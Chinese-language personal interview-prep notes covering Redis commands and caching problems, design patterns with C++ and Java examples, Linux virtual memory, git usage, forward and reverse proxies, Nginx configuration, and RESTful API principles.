[全面了解mysql锁机制（InnoDB）与问题排查](https://juejin.im/post/5b82e0196fb9a019f47d1823)

## 📚 redis数据库

### 🏷 MySQL与Redis的区别

1. 数据库类型

   MySQL是关系型数据库，用于存放持久化数据，将数据存放在硬盘中，读取速度慢。

   Redis是NOSQL，即非关系型数据库，将数据存储在缓存中，缓存读取速度块，能够大大的提高运行效率，但是保存时间有限

2. MySQL运行机制

   MySQL作为持久化存储的关系型数据库，相对薄弱的地方在于每次请求访问数据库时，都存在着I/O操作，如果反复频繁的访问数据库。第一：会在反复连接数据库上花费大量的时间，从而导致运行效率过慢；第二：反复的访问数据库也会导致数据库的负载过高，那么此时缓存的概念就衍生出来了。

3. 缓存

   缓存就是数据交换的缓冲区，当浏览器执行请求时，首先会对在缓存中进行查找，如果存在，就获取；否则就访问数据库。

   缓存的好处就是读取速度快。

4. Redis数据库

   Redis数据库就是一款缓存数据库，用于存储使用频繁的数据，这样减少访问数据库的次数，提高运行效率。

一般MySQL和Redis都是配合使用的。

### 🏷 命令

Reids-cli  打开终端进入

redis-cli -h host -p port -a password  远程进入

| key命令                     |                                                              |
| --------------------------- | ------------------------------------------------------------ |
| Del key                     | 删除                                                         |
| DUMP key                    | 序列化                                                       |
| EXISTS key                  | 检查是否存在                                                 |
| EXPIRE key seconds          | 为key设定过期时间                                            |
| Keys pattern                | 模式化查找 keys *：查找所有                                  |
| Move key db                 | 将当前key移动到给定数据库                                    |
| persist  key                | 移除key的过期时间，将key持久保存                             |
| **字符串命令**              |                                                              |
| Set key value               |                                                              |
| Get key                     |                                                              |
| getrange key start end      | 返回key中对应的子字符串                                      |
| Getset key value            | 将给定的key的值设为value，并返回key的旧值                    |
| ...                         |                                                              |
| **Hash**                    |                                                              |
| Hdel key field1             | 删除一个哈希字段                                             |
| Hexists key field           |                                                              |
| Hget key field              |                                                              |
| Hgetall key                 | 返回key的所有字段                                            |
| Hincrby key field increment | 某值加上增量increment                                        |
| Hkeys key                   | 所有的字段                                                   |
| HLen key                    | 字段数量                                                     |
| HVals key                   | 所有字段值                                                   |
| **List**                    |                                                              |
| Lpush key val               | 添加元素                                                     |
| Lrange key start end        | 返回区间内元素                                               |
| Lpop key                    | 移出并获得第一个元素                                         |
| **set**                     | 是string类型的无序集合。hash表实现                           |
| Sadd key member1 member2    | 插入                                                         |
| Scard key                   | 获取                                                         |
| Smembers key                | 返回集合中所有成员                                           |
| Spop key                    | 移出并返回一个随机元素                                       |
| ...                         |                                                              |
| **sorted set **             | 有序集合，不允许重复成员，每个元素关联一个double类型的分数。通过分数来进行排序 |
| Zadd key score member       | 添加                                                         |
| Zcard key                   | 获取所有的成员                                               |
| zcount key min max          | 获取指定区域的成员                                           |
| **发布订阅**                |                                                              |
| **Redis事务**               | Redis事务的执行不是原子性的，中间某条命令失败不会导致前面的事务回滚，也不会导致后面的事务不做 |
| multi                       | 开启一个事务                                                 |
| exec                        | 执行事务                                                     |

### 常见的缓存更新策略剖析

https://zhuanlan.zhihu.com/p/86396877

作者：是瑶瑶公主吖
链接：https://www.nowcoder.com/discuss/513385?type=2&channel=1009&source_id=discuss_terminal_discuss_hot
来源：牛客网

#### 缓存穿透是什么？⭐

缓存穿透指查询不存在的数据，缓存层和存储层都不会命中，导致不存在的数据每次请求都要到存储层查询，可能会使后端负载增大。

解决：① 缓存空对象，如果一个查询返回结果为 null，仍然缓存，为其设置很短的过期时间。② 布隆过滤器，将所有可能存在的数据映射到一个足够大的 Bitmap 中，在用户发起请求时首先经过布隆过滤器的拦截，一个一定不存在的数据会被拦截。

#### 缓存击穿是什么？⭐⭐

对于热数据的访问量非常大，在其缓存失效的瞬间，大量请求直达存储层，导致服务崩溃。

会造成某一时刻数据库请求量过大，压力剧增。

解决：① 加锁互斥，当一个线程访问后，缓存数据会被重建。② 永不过期，为热点数据不设置过期时间。

上面的现象是多个线程同时去查询数据库的这条数据，那么我们可以在第一个查询数据的请求上使用一个 互斥锁来锁住它。

其他的线程走到这一步拿不到锁就等着，等第一个线程查询到了数据，然后做缓存。后面的线程进来发现已经有缓存了，就直接走缓存。

#### 缓存雪崩是什么？⭐

如果缓存层因为某些问题不能提供服务，所有请求都会到达存储层，对数据库造成巨大压力。

解决：① 保证高可用性，使用集群。② 依赖隔离组件为后端限流并降级，降级机制在高并发系统中使用普遍，例如在推荐服务中，如果个性化推荐服务不可用，可以降级补充热点数据，避免前端页面空白。③ 构建多级缓存，增加本地缓存，降低请求直达存储层概率。

#### 缓存预热

缓存预热就是系统上线后，将相关的缓存数据直接加载到缓存系统。这样就可以避免在用户请求时候，先查询数据库，然后在将数据缓存的问题。用户直接查询事先被预热的缓存数据。

如果不进行预热，那么Redis初始状态数据为空，系统上线初期，对于高并发的流量，都会访问数据库，对数据库造成流量的压力。

解决方案：

1. 数据量不大的时候，工程启动的时候进行加载缓存动作。
2. 数据量大的时候，设置一个定时任务脚本，进行缓存的刷新。
3. 数据量太大时候，优先保证热点数据进行提前加载到缓存。

#### 缓存降级

就是缓存失效或缓存服务器挂掉情况下，我们也不去访问数据库。我们直接访问内存部分数据缓存或直接返回默认数据。

对于应用的首页，一般是访问量非常大的地方，首页里面往往包含了部分推荐商品的展示信息、这些信息往往都会放到缓存中存储，同时我们为了避免缓存的异常情况，对热点商品数据也存储到了内存中。同时内存还保留了一些默认的商品信息。

降级一般是有损的操作，所以尽量减少降级对于业务的影响程度。

#### 解决热点数据集中失效问题

设置不同的失效时间

互斥锁

https://juejin.im/post/6844903807797690376

[Redis持久化](https://segmentfault.com/a/1190000002906345)

### 基于Redis的分布式锁实现

[基于Redis的分布式锁实现](https://juejin.im/post/6844903830442737671)



## 📚 设计模式

### 🏷 单例模式

确保一个类只有一个实例，并提供该实例的全局访问点

1. 将构造函数、析构函数、复制构造函数、复制操作符声明为私有，即可实现单例模式

```c
//常用单例
class Singleton
{
public:
	static Singleton* Instance()
    {
        if(_instance == nullptr)
        {
            _instance = new Singleton;
        }
        return _instance;
    }
protected:
    Singleton(){};
private:
    static Singleton* _instance;
};
```

2. 为了避免用户复制行为，可以将复制构造函数声明为private或使用C++11的delete语法。

```c
public:
	Singleton& operator = (Singleton res) = delete;
```

3. 上述单例模式是线程不安全的，如果碰巧有多个线程在同时调用该方法，那么可能被多次构造。

   可以在存在竞争的地方加上互斥锁。

### 🏷 简单工厂，工厂方法，抽象工厂

> 作者：激情的狼王
> 链接：https://www.jianshu.com/p/6d447cea14c7
> 来源：简书
> 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

#### 简单工厂

> **工厂类角色**：这是本模式的核心，含有一定的商业逻辑和判断逻辑，根据逻辑不同，产生具体的工厂产品。如例子中的Driver类。
>  **抽象产品角色**：它一般是具体产品继承的父类或者实现的接口。由接口或者抽象类来实现。如例中的Car接口。
>  **具体产品角色**：工厂类所创建的对象就是此角色的实例。在java中由一个具体类实现，如例子中的Benz、Bmw类。

```java
//抽象产品  
abstract class Car{  
    private String name;  
      
    public abstract void drive();  
      
    public String getName() {  
        return name;  
    }  
    public void setName(String name) {  
        this.name = name;  
    }  
}  
//具体产品  
class Benz extends Car{  
    public void drive(){  
        System.out.println(this.getName()+"----go-----------------------");  
    }  
}  
  
class Bmw extends Car{  
    public void drive(){  
        System.out.println(this.getName()+"----go-----------------------");  
    }  
}  
  
//简单工厂  
class Driver{  
    public static Car createCar(String car){  
        Car c = null;  
        if("Benz".equalsIgnoreCase(car))  
            c = new Benz();  
        else if("Bmw".equalsIgnoreCase(car))  
            c = new Bmw();  
        return c;  
    }  
}  
  
//main方法  
public class BossSimplyFactory {  
  
    public static void main(String[] args) throws IOException {  
        Car car = Driver.createCar("benz");  
        car.setName("benz");  
        car.drive();  
    }  
```

#### 工厂方法模式

> **抽象工厂角色**： 这是工厂方法模式的核心，它与应用程序无关。是具体工厂角色必须实现的接口或者必须继承的父类。在java中它由抽象类或者接口来实现。
>  **具体工厂角色**：它含有和具体业务逻辑有关的代码。由应用程序调用以创建对应的具体产品的对象。在java中它由具体的类来实现。
>  **抽象产品角色**：它是具体产品继承的父类或者是实现的接口。在java中一般有抽象类或者接口来实现。
>  **具体产品角色**：具体工厂角色所创建的对象就是此角色的实例。在java中由具体的类来实现。

```java
//抽象产品  
abstract class Car{  
    private String name;  
      
    public abstract void drive();  
      
    public String getName() {  
        return name;  
    }  
    public void setName(String name) {  
        this.name = name;  
    }  
}  
//具体产品  
class Benz extends Car{  
    public void drive(){  
        System.out.println(this.getName()+"----go-----------------------");  
    }  
}  
class Bmw extends Car{  
    public void drive(){  
        System.out.println(this.getName()+"----go-----------------------");  
    }  
}  
  
  
//抽象工厂  
abstract class Driver{  
    public abstract Car createCar(String car) throws Exception;  
}  
//具体工厂（每个具体工厂负责一个具体产品）  
class BenzDriver extends Driver{  
    public Car createCar(String car) throws Exception {  
        return new Benz();  
    }  
}  
class BmwDriver extends Driver{  
    public Car createCar(String car) throws Exception {  
        return new Bmw();  
    }  
}  
  
public class Boss{ 
    public static void main(String[] args) throws Exception {  
        Driver d = new BenzDriver();  
        Car c = d.createCar("benz");   
        c.setName("benz");  
        c.drive();  
    }  
} 

```

#### 抽象工厂

> **抽象工厂角色**： 这是工厂方法模式的核心，它与应用程序无关。是具体工厂角色必须实现的接口或者必须继承的父类。在java中它由抽象类或者接口来实现。
>  **具体工厂角色**：它含有和具体业务逻辑有关的代码。由应用程序调用以创建对应的具体产品的对象。在java中它由具体的类来实现。
>  **抽象产品角色**：它是具体产品继承的父类或者是实现的接口。在java中一般有抽象类或者接口来实现。
>  **具体产品角色**：具体工厂角色所创建的对象就是此角色的实例。在java中由具体的类来实现。

```java
//抽象产品（Bmw和Audi同理）  
abstract class BenzCar{  
    private String name;  
      
    public abstract void drive();  
      
    public String getName() {  
        return name;  
    }  
    public void setName(String name) {  
        this.name = name;  
    }  
}  
//具体产品（Bmw和Audi同理）  
class BenzSportCar extends BenzCar{  
    public void drive(){  
        System.out.println(this.getName()+"----BenzSportCar-----------------------");  
    }  
}  
class BenzBusinessCar extends BenzCar{  
    public void drive(){  
        System.out.println(this.getName()+"----BenzBusinessCar-----------------------");  
    }  
}  
  
abstract class BmwCar{  
    private String name;  
      
    public abstract void drive();  
      
    public String getName() {  
        return name;  
    }  
    public void setName(String name) {  
        this.name = name;  
    }  
}  
class BmwSportCar extends BmwCar{  
    public void drive(){  
        System.out.println(this.getName()+"----BmwSportCar-----------------------");  
    }  
}  
class BmwBusinessCar extends BmwCar{  
    public void drive(){  
        System.out.println(this.getName()+"----BmwBusinessCar-----------------------");  
    }  
}  
  
abstract class AudiCar{  
    private String name;  
      
    public abstract void drive();  
      
    public String getName() {  
        return name;  
    }  
    public void setName(String name) {  
        this.name = name;  
    }  
}  
class AudiSportCar extends AudiCar{  
    public void drive(){  
        System.out.println(this.getName()+"----AudiSportCar-----------------------");  
    }  
}  
class AudiBusinessCar extends AudiCar{  
    public void drive(){  
        System.out.println(this.getName()+"----AudiBusinessCar-----------------------");  
    }  
}  
//抽象工厂  
abstract class Driver3{  
    public abstract BenzCar createBenzCar(String car) throws Exception;  
      
    public abstract BmwCar createBmwCar(String car) throws Exception;  
      
    public abstract AudiCar createAudiCar(String car) throws Exception;  
}  
//具体工厂  
class SportDriver extends Driver3{  
    public BenzCar createBenzCar(String car) throws Exception {  
        return new BenzSportCar();  
    }  
    public BmwCar createBmwCar(String car) throws Exception {  
        return new BmwSportCar();  
    }  
    public AudiCar createAudiCar(String car) throws Exception {  
        return new AudiSportCar();  
    }  
}  
class BusinessDriver extends Driver3{  
    public BenzCar createBenzCar(String car) throws Exception {  
        return new BenzBusinessCar();  
    }  
    public BmwCar createBmwCar(String car) throws Exception {  
        return new BmwBusinessCar();  
    }  
    public AudiCar createAudiCar(String car) throws Exception {  
        return new AudiBusinessCar();  
    }  
}  
  
public class BossAbstractFactory {  
  
    public static void main(String[] args) throws Exception {    
        Driver3 d = new BusinessDriver();  
        AudiCar car = d.createAudiCar("");  
        car.drive();  
    }  
}  
```



## 📚Linux

### 🏷 Linux虚拟地址到物理地址转换

https://blog.csdn.net/yetaibing1990/article/details/88344416

CPU通过地址来访问内存中的单元，地址有虚拟地址和物理地址之分

MMU（Memory Management Unit，内存管理单元）

如果CPU启用了MMU，CPU核发出的地址将会被MMU截获，从CPU到MMU的地址称为虚拟地址，而MMU将这个地址翻译成另一个地址（物理地址）

虚拟地址和物理内存地址的分离，给进程带来便利性和安全性。虚拟地址必须和物理地址建立一一对应关系，才能正确的进行地址转换。

Linux采用分页的方式来记录对应关系。所谓分页，就是以更大尺寸的单位页来管理内存。

#### **内核空间和用户空间**

​    Linux的虚拟地址空间范围为0～4G，Linux内核将这4G字节的空间分为两部分，将最高的1G字节（从虚拟地址0xC0000000到0xFFFFFFFF）供内核使用，称为“内核空间”。而将较低的3G字节（从虚拟地址0x00000000到0xBFFFFFFF）供各个进程使用，称为“用户空间。因为每个进程可以通过系统调用进入内核，因此，Linux内核由系统内的所有进程共享。于是，从具体进程的角度来看，每个进程可以拥有4G字节的虚拟空间。

## 📚 杂货

### 🏷 git总结

[参考](https://labuladong.gitbook.io/algo/di-wu-zhang-ji-suan-ji-ji-shu/git-chang-yong-ming-ling)

一个学习git的[好地方](https://learngitbranching.js.org/)

#### git的三个分区

**working directory** : 工作目录，`git add`可以将其提交到stage area区域

> git add .     //提交至暂存区                                    git commit -a   直接提交到历史仓库
>
> git checkout .     //将修改从暂存区还原到工作区

**stage area**：暂存区 `git commit`将其提交到commit history

> git commit -m "xx"     //暂存区提交到历史仓库
>
> git reset a.txt        // 撤回到暂存区

**commit history**：【提交历史区】进入此地的东西基本上被认为不会丢失了

> git checkout HEAD .    回到最初状态  上一个版本

#### git分支

`git checkout -b newb`  创建新分支

`git branch v1` 创建分支，但不会进入分支

`git branch -d v1` 删除分支

`git checkout newb` 切换分支

`git merge newb` 合并分支到`master`中

> 此时会新建一个commit，如果合并至遇到了冲突，仅需修改后重新commit

`git rebase`  合并分支

> 会合并之前的commit历史
>
> 优点：得到更简洁的项目历史
>
> 缺点：如果合并出现代码问题不容易定位
>
> 在`newb`分支上执行 `git rebase master`将分支合并到master

`git merge` 与`git rebase`区别

![img](http://xyongs.cn/image/merge-6-24.png)

![img](http://xyongs.cn/image/rebase-6-24.png)

`git log` 查看提交记录的哈希值

`git reflog`查看提交记录

`git reset --hard 2ec540` 返回到某个版本

#### HEAD

HEAD 是一个对当前检出记录的符号引用--也就是指向你正在其基础上进行工作的提交记录

`git checkout HEAD^` 将HEAD向上移动一个版本

`git checkout HEAD~n`将HEAD向上移动n个版本

#### branch 

`git branch -f master HEAD ~3` 将master分支强制指向HEAD的第三级父分支

#### reset 与 revert 撤销变更

`git reset` : 通过把分支记录回退几个提交记录来实现撤销修改。“改写历史”。原来的提交记录没有发生过一样。这种“改写历史”的方法对大家一起使用的远程分支是无效的。

`git revert`: 为了撤销更改并分享给别人。他会在我们撤销提交记录后面新建一个提交，这个提交与没有更改前的提交相同。 

#### git cherry-pick <提交号>

将一些提交复制到当前所在的位置HEAD下面

#### rebase

`git rebase -i HEAD~4` : 操作HEAD前4个提交，**可以调整提交记录的顺序**，删除不想要的提交，合并提交

#### 远程仓库

`git fetch` : 从远程仓库获得数据，没有与本地分支合并

`git pull`: 从远程仓库中获取数据；  pull = fetch + merge  ，下拉远程并与本地分支合并

### 🏷 正向代理与反向代理

**正向代理**（Forward Proxy）

是指一个位于客户端和原始服务器端之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标（原始服务器），然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端才能使用正向代理

**反向代理（Reverse Proxy）**

是指代理服务器来接受Internet上的请求，然后将请求转发给内部网络的服务器，并将从服务器上得到的返回结果返回给Internet上请求连接的客户端。

**特点：**

正向代理：

1. 代理客户
2. 隐藏真实的客户，为客户端收发请求，使得真实客户端服务器不可见

反向代理：

1. 代理服务器；
2. 隐藏真实的服务器，为服务器收发请求，使得真实的服务器端不可见；
3. 负载均衡服务器，将用户的请求分发到空闲的服务器上
4. 意味着用户和负载均衡服务器直接通信，即用户解析服务器域名时得到的是负载均衡服务器的IP

**共同点**

1. 都是作为客户端和服务器端的中间层
2. 都可以加强内网的安全性，阻止web攻击
3. 都可以做缓存机制，提高访问速度

**实际应用**

正向代理---科学上网

#### VPN（Virtual Private Network）

是一种加密通讯技术，它被设计出来的目的是数据传输安全和网络匿名。

使用VPN协议的问题是，流量特征过于明显。墙目前已经能够精确的识别。

#### VPS （virtual Private Server，虚拟专用服务器）

是由VPS提供商维护，租用给站长的不会关机的电脑。（虚拟：VPS不是一台独立的电脑，而是将一台巨型服务虚拟化若干台看似独立的服务器）

参考： [【前端词典】如何向老板解释反向代理](https://juejin.im/post/5ce6b9c9f265da1b7b31637c#heading-0)

### 🏷 Nginx

> Nginx 是一款轻量级的HTTP服务器，采用事件驱动和异步非阻塞处理方式框架，这让其具有良好的IO姓名，时常用于服务器的反向代理和负载均衡

优点：

1. 一种轻量级的web服务器
2. 事件驱动和异步非阻塞IO
3. 占用内存少，启动快、并发能力强
4. 使用c语言开发，扩展性好，三方插件多，应用广泛

> 英文文档：[nginx.org/en/docs/](http://nginx.org/en/docs/)
>
> 中文文档：[www.nginx.cn/doc/](https://www.nginx.cn/doc/)

#### 应用

**动静分离**

![img](http://xyongs.cn/image/nginx-6-22.png)

Nginx将接收到的请求分为动态请求和静态请求。

静态请求直接从Nginx服务器所设定的根目录去取，动态请求直接转发给真实的后台处理

这样做不仅能给应用服务器减轻压力，将后台API接口服务化，还能将前后端代码分离开。

```shell
server {  
        listen       8080;        
        server_name  localhost;
        location / {
            root   html; # Nginx默认值
            index  index.html index.htm;
        }   
        # 静态化配置，所有静态请求都转发给 nginx 处理，存放目录为 my-project
        location ~ .*\.(html|htm|gif|jpg|jpeg|bmp|png|ico|js|css)$ {
            root /usr/local/var/www/my-project; # 静态请求所代理到的根目录
        }        
        # 动态请求匹配到path为'node'的就转发到8002端口处理
        location /node/ {  
            proxy_pass http://localhost:8002; # 充当服务代理
        }
}
```

**正向代理--见上章**

**反向代理--见上章**

**负载均衡**

随着业务的不断增长和用户的不断增多，一台服务已经满足不了系统要求了。这个时候就出现了服务器 [集群](https://www.cnblogs.com/bhlsheji/p/4026296.html)。

在服务器集群中，Nginx 可以将接收到的客户端请求“均匀地”（严格讲并不一定均匀，可以通过设置权重）分配到这个集群中所有的服务器上。这个就叫做**负载均衡**。

> 负载均衡的作用
>
> - 分摊服务器集群压力
> - 保证客户端访问的稳定性

```shell
# 负载均衡：设置domain
upstream domain {
    server localhost:8000;
    server localhost:8001;
}
server {  
        listen       8080;        
        server_name  localhost;
        location / {
            # root   html; # Nginx默认值
            # index  index.html index.htm;
            proxy_pass http://domain; # 负载均衡配置，请求会被平均分配到8000和8001端口
            proxy_set_header Host $host:$server_port;
        }
}
```

[连前端都看得懂的《Nginx 入门指南》](https://juejin.im/post/5e982d4b51882573b0474c07)

[推荐 | 如何用Nginx来助力前端开发](https://juejin.im/post/5e9ab2e851882573a67f62a0)

##### 负载均衡策略

1. 轮询（默认）

   ```
   upstream backserver {
   	server 192.168.0.14;
   	server 192.168.0.15;
   }
   ```

2. 按权重轮询

   ```
   upstream backserver{
   	server 192.168.0.14 weight = 3;
   	server 192.168.0.15 weight = 7;
   }
   ```

3. IP_hash

   上述方法存在一个问题就是说，在负载均衡系统中，假如用户在某台服务器上登录了，那么该用户第二次请求的时候，可能会再重新定位到另一台服务器，其登录信息将会丢失，这样显然不妥。

   我们可以采用IP_hash指令解决这个问题，如果客户已经访问了某个服务器，当用户再次访问时，会将该请求通过哈希算法，自动定位到该服务器。

4. fair （第三方），按后端服务器的响应时间来分配请求，响应时间短的优先分配

5. url_hash （第三方）

   按访问URL的hash结果来分配请求，使每个URL定向到同一个后端服务器。

### 🏷 项目

#### RESTful API

对前后端分离开发的一种接口约束方式。

RESTful只是一种架构方式的约束，给出一种约定的标准。

REST：Repersentational State Transfer (表象层状态转变)

1. 每一个URI代表一种资源
2. 客户端和服务器之间，传递这种资源的某种表现层
3. 客户端通过（get, post, put, delete）对服务器资源进行操作。

#### RESTful原则

1. c-s架构

   数据存储在server端,Client端只需要使用就行。两端单独开发，互不干扰

2. 无状态

   HTTP请求本身就是无状态的，基于C-S架构，客户端的每一次请求带有充分的信息能够让服务端识别。

3. 统一的接口

   这才是REST架构的核心，统一的接口对RESTful服务非常重要。客户端只需要关注实现接口就可以，接口可读性加强，使用人员方便调用。

4. 一致的数据格式

   服务端返回的数据格式要么是XML，要么是json，或者直接返回状态码。

5. 系统分层

6. 可缓存

7. 按需编码、可制定代码

[面试官：你连RESTful都不知道我怎么敢要你](https://www.cnblogs.com/zhangmumu/p/11936262.html)

#### 场景

[微信朋友圈是怎么做的架构？](https://www.jianshu.com/p/3fb3652ff450)

## 参考

[https://interview.huihut.com/#/?id=%e2%ad%90%ef%b8%8f-effective](https://interview.huihut.com/#/?id=⭐️-effective)

https://github.com/CyC2018/CS-Notes/tree/master/docs/notes

https://www.nowcoder.com/tutorial/93/8ba2828006dd42879f3a9029eabde9f1



### 面试题汇总

#### 智能指针

内存泄漏：程序未能释放已经不能在使用的内容

#### RAII对象，资源获取及初始化

在构造函数中创建，在析构函数中销毁

如：智能指针，std::lock_guard<std::mutex> l1(mutex);

```c++
class CWinLock
{
public:
    CWinLock(CRITICAL_SECTION* pCritmp)
    {
        m_pCritmp = pCritmp;
        EnterCriticalSection(m_pCritmp);
    }
    ~CWinLock()
    {
        LeaveCriticalSection(m_pCritmp);
    }
private:
    CRITICAL_SECTION* m_pCritmp;
}
```

